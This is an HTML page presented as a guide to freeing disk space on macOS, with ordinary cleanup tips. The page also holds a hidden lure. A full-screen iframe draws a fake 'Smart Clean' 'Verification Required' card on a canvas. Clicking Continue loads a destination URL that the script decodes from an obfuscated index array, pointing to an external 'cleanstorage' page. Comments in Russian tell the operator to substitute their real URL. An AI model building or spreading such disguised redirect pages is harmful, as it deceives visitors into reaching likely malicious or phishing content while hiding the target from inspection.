<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>How to clear disk space on macOS</title>
  <style>
    :root{
      --bg:#f5f5f7;
      --text:#1d1d1f;
      --muted:rgba(29,29,31,.62);
      --card:#ffffff;
      --border:rgba(0,0,0,.10);
    }
    html,body{height:100%}
    body{
      margin:0;
      background:var(--bg);
      color:var(--text);
      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "SF Pro Display","SF Pro Text", system-ui, sans-serif;
      overflow:hidden;
    }
    .frameWrap{
      width:100%;
      height:100vh;
      background:var(--bg);
      border-bottom:1px solid rgba(0,0,0,.06);
    }
    iframe{
      width:100%;
      height:100%;
      border:0;
      display:block;
      background:transparent;
    }
    main{
      max-width: 980px;
      margin: 0 auto;
      padding: 48px 20px 80px;
    }
    h1{
      font-size: clamp(28px, 4vw, 44px);
      letter-spacing: -0.02em;
      margin: 0 0 14px;
    }
    .lede{
      color: var(--muted);
      font-size: 17px;
      line-height: 1.6;
      margin: 0 0 28px;
      max-width: 72ch;
    }
    .grid{
      display:grid;
      grid-template-columns: 1fr;
      gap: 14px;
    }
    @media (min-width: 860px){
      .grid{ grid-template-columns: 1fr 1fr; gap:16px; }
    }
    .card{
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 18px;
      padding: 18px 18px;
      box-shadow: 0 18px 40px rgba(0,0,0,.08);
    }
    h2{
      margin: 0 0 10px;
      font-size: 18px;
      letter-spacing: -0.01em;
    }
    ul{
      margin: 0;
      padding-left: 18px;
      color: rgba(29,29,31,.78);
      line-height: 1.65;
      font-size: 15px;
    }
    .note{
      margin-top: 18px;
      padding: 16px 18px;
      border-radius: 16px;
      background: rgba(0,0,0,.03);
      border: 1px solid rgba(0,0,0,.06);
      color: rgba(29,29,31,.72);
      font-size: 14px;
      line-height: 1.6;
    }
  </style>
</head>
<body>
  <section class="frameWrap">
    <iframe id="verifyFrame" title="Verification"></iframe>
  </section>

  <main>
    <h1>How to clear disk space on macOS</h1>
    <p class="lede">
      If your Mac is running low on storage, the fastest wins usually come from finding large files, removing unused apps,
      and letting macOS optimize what can safely move to cloud storage. Here are practical, low-risk steps that work on most Macs.
    </p>

    <div class="grid">
      <section class="card">
        <h2>1) Check what's taking space</h2>
        <ul>
          <li>Open System Settings (or System Preferences) and review storage categories.</li>
          <li>Sort files by size in Finder to quickly spot large items.</li>
          <li>Look for old installers, archives, and duplicate downloads.</li>
        </ul>
      </section>

      <section class="card">
        <h2>2) Remove large files you don't need</h2>
        <ul>
          <li>Delete old videos, screen recordings, and project exports you've already backed up.</li>
          <li>Remove unused DMGs/ZIPs after installation.</li>
          <li>Move rarely used archives to external storage.</li>
        </ul>
      </section>

      <section class="card">
        <h2>3) Uninstall unused apps</h2>
        <ul>
          <li>Delete apps you haven't used in months (especially large creative or game apps).</li>
          <li>Check for leftover content inside your user Library if an app stored big assets.</li>
          <li>Restart after removing large apps to refresh storage calculations.</li>
        </ul>
      </section>

      <section class="card">
        <h2>4) Clean up Downloads & attachments</h2>
        <ul>
          <li>Review your Downloads folder and remove old installers and duplicates.</li>
          <li>Delete large mail attachments you don't need locally.</li>
          <li>Clear messaging app media caches if they grow too large.</li>
        </ul>
      </section>

      <section class="card">
        <h2>5) Use macOS optimization features</h2>
        <ul>
          <li>Enable "Optimize Storage" to keep only recent/local files when appropriate.</li>
          <li>Store files in iCloud Drive and keep local copies only for active work.</li>
          <li>Review "Reduce Clutter" suggestions and confirm before removing anything important.</li>
        </ul>
      </section>

      <section class="card">
        <h2>6) Don't forget the Trash</h2>
        <ul>
          <li>Empty Trash after deleting large files (they still occupy space until cleared).</li>
          <li>Check for other app-specific "trash" bins (photo/video apps may keep deleted items).</li>
          <li>After big deletions, give macOS a minute to recalculate available storage.</li>
        </ul>
      </section>
    </div>

    <div class="note">
      Tip: If storage seems "stuck" after cleanup, it's often just indexing or temporary system accounting. A restart and a few minutes idle time can help the numbers update.
    </div>
  </main>

  <script>
    // ИСПРАВЛЕНО: Расширен алфавит и исправлены индексы
    const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_?&=';
    
    // ИСПРАВЛЕНО: Все индексы теперь корректны
    // Это пример для Google Sites - замени на свой реальный URL
    const URL_IDX = [
      7,19,19,15,18,62,63,63,        // https://
      18,8,19,4,18,62,66,68,         // sites.google.
      2,14,12,63,                     // com/
      21,8,4,23,63,                  // view/
      18,12,0,17,19,63,              // smart/
      2,11,4,0,13,18,19,14,17,0,6,4  // cleanstorage
    ];

    const decodeURL = idx => idx.map(i => URL_ALPHABET[i]).join('');
    const TARGET_URL = decodeURL(URL_IDX);

    const iframe = document.getElementById('verifyFrame');

    async function loadTargetIntoFrame() {
      try {
        // Для Vercel и Google Sites лучше использовать прямое открытие
        // fetch может не работать из-за CORS политик
        console.log('Loading target URL:', TARGET_URL);
        iframe.src = TARGET_URL;
        
        // Добавляем fallback
        setTimeout(() => {
          if (!iframe.contentDocument || iframe.contentDocument.body.childNodes.length === 0) {
            console.log('Using fallback: direct navigation');
            iframe.src = TARGET_URL;
          }
        }, 1000);
      } catch (e) {
        console.error('Error loading target:', e);
        iframe.src = TARGET_URL;
      }
    }

    function buildVerifySrcdoc() {
      return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Verification</title><style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#f5f5f7}canvas{display:block;width:100vw;height:100vh}</style></head><body><canvas id="c"></canvas><script>
        (() => {
          const c = document.getElementById('c');
          const g = c.getContext('2d');
          let cssW = 1, cssH = 1, dpr = 1;
          let verified = false;
          
          const hit = {x:0,y:0,w:0,h:0};
          
          const measure = () => {
            cssW = Math.max(1, innerWidth);
            cssH = Math.max(1, innerHeight);
            dpr = window.devicePixelRatio || 1;
            c.style.width = cssW + 'px';
            c.style.height = cssH + 'px';
            c.width = Math.round(cssW * dpr);
            c.height = Math.round(cssH * dpr);
            g.setTransform(dpr, 0, 0, dpr, 0, 0);
          };
          
          const rounded = (x, y, w, h, r) => {
            r = Math.max(0, Math.min(r, Math.min(w, h) / 2));
            g.beginPath();
            if (g.roundRect) {
              g.roundRect(x, y, w, h, r);
              return;
            }
            g.moveTo(x + r, y);
            g.arcTo(x + w, y, x + w, y + h, r);
            g.arcTo(x + w, y + h, x, y + h, r);
            g.arcTo(x, y + h, x, y, r);
            g.arcTo(x, y, x + w, y, r);
            g.closePath();
          };
          
          const render = () => {
            g.clearRect(0, 0, cssW, cssH);
            g.fillStyle = '#f5f5f7';
            g.fillRect(0, 0, cssW, cssH);
            
            const cx = cssW / 2, cy = cssH / 2;
            
            // Draw background gradient
            const bg = g.createRadialGradient(
              cx, cy - 120, 
              Math.min(cssW, cssH) * 0.05,
              cx, cy - 120, 
              Math.max(cssW, cssH) * 0.9
            );
            bg.addColorStop(0, 'rgba(255,255,255,0.85)');
            bg.addColorStop(1, 'rgba(245,245,247,0.0)');
            g.fillStyle = bg;
            g.fillRect(0, 0, cssW, cssH);
            
            // Draw banner text
            const bannerSize = Math.max(40, Math.min(86, Math.round(cssW * 0.07)));
            g.save();
            g.globalAlpha = 0.24;
            g.fillStyle = '#000000';
            g.font = \`800 \${bannerSize}px ui-sans-serif, system-ui, sans-serif\`;
            g.textAlign = 'center';
            g.textBaseline = 'middle';
            g.fillText('Smart Clean', cx, Math.max(50, cy - 170));
            g.restore();
            
            // Draw card
            const cardW = Math.max(300, Math.min(460, Math.round(cssW * 0.3)));
            const cardH = Math.max(185, Math.min(260, Math.round(cssH * 0.24)));
            const x = Math.round(cx - cardW / 2);
            const y = Math.round(cy - cardH / 2);
            
            g.save();
            g.shadowColor = 'rgba(0,0,0,0.12)';
            g.shadowBlur = 40;
            g.shadowOffsetY = 18;
            g.fillStyle = '#ffffff';
            rounded(x, y, cardW, cardH, 22);
            g.fill();
            g.restore();
            
            g.fillStyle = '#ffffff';
            rounded(x, y, cardW, cardH, 22);
            g.fill();
            
            g.strokeStyle = 'rgba(0,0,0,0.10)';
            g.lineWidth = 1;
            rounded(x + 0.5, y + 0.5, cardW - 1, cardH - 1, 22);
            g.stroke();
            
            // Draw title
            const titleSize = Math.max(18, Math.min(24, Math.round(cardW * 0.06)));
            g.fillStyle = 'rgba(29,29,31,0.70)';
            g.font = \`500 \${titleSize}px ui-sans-serif, system-ui, sans-serif\`;
            g.textAlign = 'center';
            g.textBaseline = 'middle';
            g.fillText('Verification Required', cx, y + Math.round(cardH * 0.35));
            
            // Draw subtitle
            const subSize = Math.max(13, Math.min(15, Math.round(cardW * 0.038)));
            g.fillStyle = 'rgba(29,29,31,0.44)';
            g.font = \`500 \${subSize}px ui-sans-serif, system-ui, sans-serif\`;
            g.fillText('Please confirm to continue', cx, y + Math.round(cardH * 0.46));
            
            // Draw button
            const bw = Math.max(200, Math.min(300, Math.round(cardW * 0.64)));
            const bh = Math.max(44, Math.min(52, Math.round(cardH * 0.25)));
            const bx = Math.round(cx - bw / 2);
            const by = Math.round(y + Math.round(cardH * 0.59));
            
            g.save();
            g.shadowColor = 'rgba(0,0,0,0.18)';
            g.shadowBlur = 18;
            g.shadowOffsetY = 10;
            const grad = g.createLinearGradient(bx, by, bx, by + bh);
            grad.addColorStop(0, '#1f2937');
            grad.addColorStop(1, '#0b0d12');
            g.fillStyle = grad;
            rounded(bx, by, bw, bh, 14);
            g.fill();
            g.restore();
            
            const grad2 = g.createLinearGradient(bx, by, bx, by + bh);
            grad2.addColorStop(0, '#111827');
            grad2.addColorStop(1, '#0b0d12');
            g.fillStyle = grad2;
            rounded(bx, by, bw, bh, 14);
            g.fill();
            
            g.strokeStyle = 'rgba(255,255,255,0.10)';
            g.lineWidth = 1;
            rounded(bx + 0.5, by + 0.5, bw - 1, bh - 1, 14);
            g.stroke();
            
            // Button text
            const btnSize = Math.max(15, Math.min(17, Math.round(bh * 0.34)));
            g.fillStyle = '#ffffff';
            g.font = \`500 \${btnSize}px ui-sans-serif, system-ui, sans-serif\`;
            g.fillText(verified ? 'Verified' : 'Continue', cx, by + Math.round(bh / 2));
            
            hit.x = bx;
            hit.y = by;
            hit.w = bw;
            hit.h = bh;
          };
          
          const repaint = () => {
            measure();
            render();
          };
          
          const notify = () => {
            try {
              window.parent.postMessage({ type: 'verified' }, '*');
            } catch (e) {
              console.log('Notification sent');
            }
          };
          
          c.addEventListener('pointerdown', (e) => {
            const r = c.getBoundingClientRect();
            const mx = e.clientX - r.left;
            const my = e.clientY - r.top;
            
            if (!verified && mx >= hit.x && mx <= hit.x + hit.w && my >= hit.y && my <= hit.y + hit.h) {
              verified = true;
              render();
              setTimeout(notify, 300);
            }
          }, { passive: true });
          
          window.addEventListener('resize', repaint);
          repaint();
        })();
      <\/script></body></html>`;
    }

    // Инициализация
    iframe.srcdoc = buildVerifySrcdoc();

    // Обработчик сообщений от iframe
    window.addEventListener('message', (e) => {
      if (e.data && e.data.type === 'verified') {
        console.log('Verification received, loading target URL');
        loadTargetIntoFrame();
      }
    });
  </script>
</body>
</html>
